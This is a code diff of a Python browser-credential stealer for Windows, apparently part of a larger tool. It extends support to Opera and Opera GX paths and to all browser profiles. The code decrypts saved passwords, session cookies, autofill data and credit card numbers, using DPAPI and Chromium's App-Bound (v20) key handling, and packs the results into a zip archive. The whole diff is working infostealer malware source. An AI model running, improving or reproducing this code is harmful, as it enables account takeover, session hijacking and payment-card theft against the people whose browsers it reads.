@@ -61,16 +61,16 @@ BROWSERS = {
     },
     'opera': {
         'name': 'Opera',
-        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
-        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
+        'data_path': [r'AppData\Roaming\Opera Software\Opera Stable', r'AppData\Local\Opera Software\Opera Stable'],
+        'local_state': [r'AppData\Roaming\Opera Software\Opera Stable\Local State', r'AppData\Local\Opera Software\Opera Stable\Local State'],
         'process_name': 'opera.exe',
         'key_name': 'Opera Softwarekey1',
         'chromium_based': True
     },
     'opera_gx': {
         'name': 'Opera GX',
-        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
-        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
+        'data_path': [r'AppData\Roaming\Opera Software\Opera GX Stable', r'AppData\Local\Opera Software\Opera GX Stable'],
+        'local_state': [r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', r'AppData\Local\Opera Software\Opera GX Stable\Local State'],
         'process_name': 'opera.exe',
         'key_name': 'Opera Softwarekey1',
         'chromium_based': True
@@ -381,26 +381,34 @@ def extract_chromium_bookmarks(profile_path):
         return ""
 
 def get_master_key(config):
-    if not config.get('local_state'):
-        return None
     try:
         user_profile = os.environ['USERPROFILE']
-        local_state_path = pathlib.Path(user_profile) / config['local_state']
-        if not local_state_path.exists():
+        local_state_paths = config['local_state']
+        if isinstance(local_state_paths, str):
+            local_state_paths = [local_state_paths]
+        
+        local_state_path = None
+        for path_str in local_state_paths:
+            p = pathlib.Path(user_profile) / path_str
+            if p.exists():
+                local_state_path = p
+                break
+        
+        if not local_state_path:
             return None
+            
         with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
             local_state = json.load(f)
         if 'os_crypt' not in local_state:
             return None
         if 'app_bound_encrypted_key' in local_state['os_crypt']:
-            print(f"   [*] Detected v20 (App-Bound) encryption")
+            print(f"   [*] Detected v20 (App-Bound) encryption for {config['name']}")
             enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
         elif 'encrypted_key' in local_state['os_crypt']:
-            print(f"   [*] Detected v10 (DPAPI) encryption")
+            print(f"   [*] Detected v10 (DPAPI) encryption for {config['name']}")
             enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
             return windows.crypto.dpapi.unprotect(enc_key)
         else:
-            print(f"   [!] No encrypted key found in Local State")
             return None
 
         print(f"   [*] Attempting App-Bound decryption...")
@@ -413,6 +421,7 @@ def get_master_key(config):
             parsed = parse_key_blob(user_dec)
             if parsed['flag'] not in (1, 2, 3):
                 return user_dec[-32:]
+            print(f"   [*] Attempting App-Bound decryption with key: {config['key_name']}...")
             return derive_v20_master_key(parsed, config['key_name'])
         except Exception as inner_e:
             print(f"   [!] App-Bound decryption failed: {inner_e}")
@@ -427,172 +436,188 @@ def write_to_zip(zf, zip_path: str, content: str):
 
 def process_chromium_browser(browser_name, config, master_key, zf):
     user_profile = os.environ['USERPROFILE']
-    data_path = pathlib.Path(user_profile) / config['data_path']
-    if not data_path.exists():
-        return
+    data_paths = config['data_path']
+    if isinstance(data_paths, str):
+        data_paths = [data_paths]
+    
+    for path_str in data_paths:
+        data_path = pathlib.Path(user_profile) / path_str
+        if not data_path.exists():
+            continue
+        
+        # Tüm profil klasörlerini al
+        profiles = [p for p in data_path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile ") or "profile" in p.name.lower())]
 
-    # Tüm profil klasörlerini al
-    profiles = [p for p in data_path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile ") or "profile" in p.name.lower())]
+        # Opera/Opera GX fallback: Eğer profil klasörü bulunamazsa ve ana dizinde kritik dosyalar varsa, ana dizini profil say
+        if not profiles:
+            profile_indicators = ["Login Data", "Cookies", "Web Data", "Network/Cookies", "Network\\Cookies"]
+            if any((data_path / ind).exists() for ind in profile_indicators):
+                profiles = [data_path]
 
-    # Opera/Opera GX fallback: Eğer profil klasörü bulunamazsa ve ana dizinde Login Data varsa, ana dizini profil say
-    if not profiles and (data_path / "Login Data").exists():
-        profiles = [data_path]
+        for profile_dir in profiles:
+            profile_name = profile_dir.name
+            # Avoid long folder names for prefix
+            p_name = profile_name if len(profile_name) < 20 else profile_name[:17] + "..."
+            prefix = f"{browser_name}/{p_name}/"
 
-    for profile_dir in profiles:
-        profile_name = profile_dir.name
-        prefix = f"{browser_name}/{profile_name}/"
-
-        # Passwords
-        passwords_content = ""
-        login_db = profile_dir / "Login Data"
-        if login_db.exists():
-            conn, tmp_path = get_db_connection(login_db)
-            if conn:
-                try:
-                    cur = conn.cursor()
-                    cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0")
-                    for url, user, pw in cur.fetchall():
-                        # v20 encryption
-                        if pw.startswith(b'v20'):
-                            dec = decrypt_v20_password(pw, master_key)
-                            if dec and dec != "DECRYPT_FAILED":
-                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                        # v10 encryption (older Chrome + DPAPI)
-                        elif pw.startswith(b'v10'):
-                            try:
-                                dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
-                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                            except: pass
-                        # Legacy DPAPI (unprefixed)
-                        else:
-                            try:
-                                dec = windows.crypto.dpapi.unprotect(pw).decode('utf-8', errors='replace')
-                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                            except: pass
-                    conn.close()
-                    if passwords_content.strip():
-                        write_to_zip(zf, prefix + "passwords.txt", passwords_content)
-                except: pass
-                finally:
-                    if tmp_path and tmp_path.exists(): os.unlink(tmp_path)
-
-        # Cookies
-        cookies_content = ""
-        # Chrome/Edge/Brave structure: profile/Network/Cookies
-        # Opera structure: profile/Cookies
-        cookie_paths = [profile_dir / "Network" / "Cookies", profile_dir / "Cookies"]
-        for cookies_db in cookie_paths:
-            if cookies_db.exists():
-                conn, tmp_path = get_db_connection(cookies_db)
+            # Passwords
+            passwords_content = ""
+            login_db = profile_dir / "Login Data"
+            if login_db.exists():
+                conn, tmp_path = get_db_connection(login_db)
                 if conn:
                     try:
                         cur = conn.cursor()
-                        cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
-                        for host, name, path, exp, sec, httpo, enc in cur.fetchall():
-                            if not enc: continue
-                            
-                            dec = None
-                            if enc.startswith(b'v20'):
-                                dec = decrypt_v20_value(enc, master_key)
-                            elif enc.startswith(b'v10'):
+                        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0")
+                        for url, user, pw in cur.fetchall():
+                            # v20 encryption
+                            if pw.startswith(b'v20'):
+                                dec = decrypt_v20_password(pw, master_key)
+                                if dec and dec != "DECRYPT_FAILED":
+                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                            # v10 encryption (older Chrome + DPAPI)
+                            elif pw.startswith(b'v10'):
                                 try:
-                                    dec = windows.crypto.dpapi.unprotect(enc[3:]).decode('utf-8', errors='replace')
+                                    dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
+                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
                                 except: pass
-                            
-                            if dec and dec != "DECRYPT_FAILED" and name and host:
-                                # URL-encode for safety
-                                safe_dec = urllib.parse.quote(dec)
-                                
-                                # Check if size exceeds 4KB browser limit
-                                if len(safe_dec) > 4096:
-                                    compact_dec = dec.replace('\n', '').replace('\r', '').replace('\t', ' ').replace(';', '%3B')
-                                    if len(compact_dec) <= 4096:
-                                        safe_dec = compact_dec
-                                    else:
-                                        continue 
-
-                                # Cleanup other fields to prevent format breakage
-                                name_s = str(name).replace('\t', ' ').replace('\n', '').replace('\r', '')
-                                host_s = str(host).replace('\t', ' ').replace('\n', '').replace('\r', '')
-                                path_s = str(path if path else "/").replace('\t', ' ').replace('\n', '').replace('\r', '')
-
-                                # Convert Chromium timestamp (microseconds since 1601) to Unix timestamp (seconds since 1970)
+                            # Legacy DPAPI (unprefixed)
+                            else:
                                 try:
-                                    secs = int(exp) // 1000000
-                                    unix_exp = secs - 11644473600 if secs > 11644473600 else 0
-                                except:
-                                    unix_exp = 0
-
-                                line = f"{host_s}\tTRUE\t{path_s}\t{str(bool(sec)).upper()}\t{unix_exp}\t{name_s}\t{safe_dec}\n"
-                                cookies_content += line
+                                    dec = windows.crypto.dpapi.unprotect(pw).decode('utf-8', errors='replace')
+                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                                except: pass
                         conn.close()
-                        if cookies_content.strip():
-                            write_to_zip(zf, prefix + "cookies.txt", cookies_content)
-                            break # Found cookies, no need to check other paths
+                        if passwords_content.strip():
+                            write_to_zip(zf, prefix + "passwords.txt", passwords_content)
                     except: pass
                     finally:
                         if tmp_path and tmp_path.exists(): os.unlink(tmp_path)
 
-        # Credit Cards & Autofill
-        autofill_content = ""
-        credit_cards_content = ""
-        webdata_db = profile_dir / "Web Data"
-        if webdata_db.exists():
-            conn, tmp_path = get_db_connection(webdata_db)
-            if conn:
-                try:
-                    cur = conn.cursor()
-                    
-                    # Local CVCs
-                    local_cvcs = {}
-                    try:
-                        cur.execute("SELECT guid, value_encrypted FROM local_stored_cvc")
-                        for guid, encrypted in cur.fetchall():
-                            local_cvcs[guid] = encrypted
-                    except: pass
-
-                    # Autofill
-                    try:
-                        cur.execute("SELECT name, value FROM autofill")
-                        for name, val in cur.fetchall():
-                            if name:
-                                if isinstance(val, bytes) and val.startswith(b'v20'):
-                                    dec = decrypt_v20_value(val, master_key)
-                                elif isinstance(val, bytes) and val.startswith(b'v10'):
-                                    try: dec = windows.crypto.dpapi.unprotect(val[3:]).decode('utf-8', errors='replace')
-                                    except: dec = str(val)
+            # Cookies
+            cookies_content = ""
+            # Chrome/Edge/Brave structure: profile/Network/Cookies
+            # Opera structure: profile/Cookies
+            cookie_paths = [profile_dir / "Network" / "Cookies", profile_dir / "Cookies"]
+            for cookies_db in cookie_paths:
+                if cookies_db.exists():
+                    conn, tmp_path = get_db_connection(cookies_db)
+                    if conn:
+                        try:
+                            cur = conn.cursor()
+                            cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies")
+                            for host, name, path, exp, sec, httpo, enc in cur.fetchall():
+                                if not enc: continue
+                                
+                                dec = None
+                                if enc.startswith(b'v20'):
+                                    dec = decrypt_v20_value(enc, master_key)
+                                elif enc.startswith(b'v10'):
+                                    try:
+                                        dec = windows.crypto.dpapi.unprotect(enc[3:]).decode('utf-8', errors='replace')
+                                    except:
+                                        # Fallback to v20 decryption if legacy DPAPI fails (some modern builds)
+                                        dec = decrypt_v20_value(enc, master_key)
                                 else:
-                                    dec = str(val) if val else ""
-                                autofill_content += f"Field: {name}\nValue: {dec}\n\n"
-                    except: pass
-                    
-                    # Credit Cards
+                                    try:
+                                        dec = windows.crypto.dpapi.unprotect(enc).decode('utf-8', errors='replace')
+                                    except: pass
+                                
+                                if dec and dec != "DECRYPT_FAILED" and name and host:
+                                    # URL-encode for safety
+                                    safe_dec = urllib.parse.quote(dec)
+                                    
+                                    # Check size limit
+                                    if len(safe_dec) > 4096:
+                                        compact_dec = dec.replace('\n', '').replace('\r', '').replace('\t', ' ').replace(';', '%3B')
+                                        if len(compact_dec) <= 4096:
+                                            safe_dec = compact_dec
+                                        else:
+                                            continue 
+
+                                    # Cleanup other fields to prevent format breakage
+                                    name_s = str(name).replace('\t', ' ').replace('\n', '').replace('\r', '')
+                                    host_s = str(host).replace('\t', ' ').replace('\n', '').replace('\r', '')
+                                    path_s = str(path if path else "/").replace('\t', ' ').replace('\n', '').replace('\r', '')
+
+                                    # Convert Chromium timestamp (microseconds since 1601) to Unix timestamp (seconds since 1970)
+                                    try:
+                                        secs = int(exp) // 1000000
+                                        unix_exp = secs - 11644473600 if secs > 11644473600 else 0
+                                    except:
+                                        unix_exp = 0
+
+                                    line = f"{host_s}\tTRUE\t{path_s}\t{str(bool(sec)).upper()}\t{unix_exp}\t{name_s}\t{safe_dec}\n"
+                                    cookies_content += line
+                            conn.close()
+                            if cookies_content.strip():
+                                write_to_zip(zf, prefix + "cookies.txt", cookies_content)
+                                break # Found cookies, no need to check other paths
+                        except: pass
+                        finally:
+                            if tmp_path and tmp_path.exists(): os.unlink(tmp_path)
+
+            # Credit Cards & Autofill
+            autofill_content = ""
+            credit_cards_content = ""
+            webdata_db = profile_dir / "Web Data"
+            if webdata_db.exists():
+                conn, tmp_path = get_db_connection(webdata_db)
+                if conn:
                     try:
-                        cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-                        for name, exp_m, exp_y, enc_num in cur.fetchall():
-                            dec_num = "Unknown"
-                            if enc_num and enc_num.startswith(b'v20'):
-                                dec_num = decrypt_v20_password(enc_num, master_key) 
-                            elif enc_num and enc_num.startswith(b'v10'):
-                                try: dec_num = windows.crypto.dpapi.unprotect(enc_num[3:]).decode('utf-8', errors='replace')
-                                except: pass
-                            
-                            credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
+                        cur = conn.cursor()
+                        
+                        # Local CVCs
+                        local_cvcs = {}
+                        try:
+                            cur.execute("SELECT guid, CAST(value_encrypted AS BLOB) FROM local_stored_cvc")
+                            for guid, encrypted in cur.fetchall():
+                                local_cvcs[guid] = encrypted
+                        except: pass
+
+                        # Autofill
+                        try:
+                            cur.execute("SELECT name, value FROM autofill")
+                            for name, val in cur.fetchall():
+                                if name:
+                                    if isinstance(val, bytes) and val.startswith(b'v20'):
+                                        dec = decrypt_v20_value(val, master_key)
+                                    elif isinstance(val, bytes) and val.startswith(b'v10'):
+                                        try: dec = windows.crypto.dpapi.unprotect(val[3:]).decode('utf-8', errors='replace')
+                                        except: dec = str(val)
+                                    else:
+                                        dec = str(val) if val else ""
+                                    autofill_content += f"Field: {name}\nValue: {dec}\n\n"
+                        except: pass
+                        
+                        # Credit Cards
+                        try:
+                            cur.execute("SELECT name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) FROM credit_cards")
+                            for name, exp_m, exp_y, enc_num in cur.fetchall():
+                                dec_num = "Unknown"
+                                if enc_num and enc_num.startswith(b'v20'):
+                                    dec_num = decrypt_v20_password(enc_num, master_key) 
+                                elif enc_num and enc_num.startswith(b'v10'):
+                                    try: dec_num = windows.crypto.dpapi.unprotect(enc_num[3:]).decode('utf-8', errors='replace')
+                                    except: pass
+                                
+                                credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
+                        except: pass
+
+                        conn.close()
+                        if autofill_content:
+                            write_to_zip(zf, prefix + "auto_fills.txt", autofill_content)
+                        if credit_cards_content:
+                            write_to_zip(zf, prefix + "credit_cards.txt", credit_cards_content)
                     except: pass
+                    finally:
+                        if tmp_path and tmp_path.exists(): os.unlink(tmp_path)
 
-                    conn.close()
-                    if autofill_content:
-                        write_to_zip(zf, prefix + "auto_fills.txt", autofill_content)
-                    if credit_cards_content:
-                        write_to_zip(zf, prefix + "credit_cards.txt", credit_cards_content)
-                except: pass
-                finally:
-                    if tmp_path and tmp_path.exists(): os.unlink(tmp_path)
+            # Bookmarks
+            bookmarks_content = extract_chromium_bookmarks(profile_dir)
+            if bookmarks_content:
+                write_to_zip(zf, prefix + "bookmarks.txt", bookmarks_content)
 
-        # Bookmarks
-        bookmarks_content = extract_chromium_bookmarks(profile_dir)
-        if bookmarks_content:
-            write_to_zip(zf, prefix + "bookmarks.txt", bookmarks_content)
 
 def process_firefox_browser(browser_name, config, zf):
     user_profile = os.environ['USERPROFILE']
